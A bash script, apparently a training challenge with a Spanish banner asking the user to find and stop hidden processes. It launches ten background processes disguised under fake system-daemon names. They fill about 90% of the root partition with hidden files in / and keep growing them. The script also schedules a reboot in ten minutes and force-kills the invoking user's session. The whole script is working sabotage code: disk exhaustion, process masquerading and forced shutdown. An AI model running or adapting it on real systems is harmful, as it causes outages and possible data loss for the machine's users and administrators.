#!/bin/bash

n=(".systemd-journal-audit" ".udev-cache-mgr" ".dbus-proxy-v2" ".snapd-fix-attr" ".network-manager-helper" ".fwupd-check-id" ".kworker-u20-1-ev" ".irq-balance-daemon" ".audit-runtime" ".lvmetad-fix")
u=${SUDO_USER:-$USER}

A=$(df / --output=avail | tail -1)
S=$(( A * 90 / 100 / 10 ))
W=$(( A * 10 / 100 / 10 / 54 ))

for i in {0..9}; do
    exec -a "${n[$i]}" bash -c "dd if=/dev/zero bs=1K count=$S >> /.sys_res_$i.dat 2>/dev/null; while true; do dd if=/dev/zero bs=1K count=$W >> /.sys_res_$i.dat 2>/dev/null; sleep 10; done" &
done

(sleep 600 && reboot) &

clear
echo "=========================================================================="
echo "OBJETIVO:"
echo "1. Detener los 10 procesos ocultos."
echo "2. Eliminar los archivos ocultos generados en /."
echo "3. Estabilizar la partición raíz."
echo "=========================================================================="
echo "⚠️ CRÍTICO: DISCO AL 90% EN 1 MINUTO. REINICIO TOTAL EN 10 MINUTOS."
echo "=========================================================================="

for i in {10..1}; do
    echo -ne "La sesión se cerrará en $i segundos... \r"
    sleep 1
done

pkill -KILL -u $u
